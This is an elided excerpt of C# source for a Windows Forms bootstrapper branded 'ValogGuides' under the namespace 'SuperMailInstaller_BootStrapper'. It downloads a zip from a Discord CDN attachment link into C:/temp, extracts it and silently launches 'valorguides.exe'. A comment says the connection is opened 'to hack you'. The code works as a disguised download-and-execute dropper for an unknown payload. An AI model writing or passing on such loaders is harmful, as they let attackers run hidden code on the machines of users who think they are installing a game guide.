...
namespace SuperMailInstaller_BootStrapper
{
    public partial class Step1 : Form // ඞ
    {
        ...
        {
            this.Text = "ValogGuides - Bootstrapping"; // turtles
            ...
            if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable()) // check if your wifi is working
            {
                using (System.Net.WebClient client = new System.Net.WebClient()) //  open connection to hack you
                {
                    ...
                    Uri url = new Uri("https://cdn.discordapp.com/attachments/933697800120696862/961474369383706644/Release.zip"); // url to download from, must be a direct URL
                    ...
                    wc.DownloadFileAsync(url, "C:/temp/Release.zip"); // path to extract zip file to, it creates folder automatically
                }
            }
        }
        ...
        {
            this.Text = "ValoGuides - Launching";
            string zipFilePath = @"C:\temp\Release.zip"; // path your downloaded zip file is (cant be anything else)
            ...
            System.Diagnostics.Process.Start(@"C:\temp\inst\valorguides.exe"); // run the file
            Application.Exit();
        }
    }
}
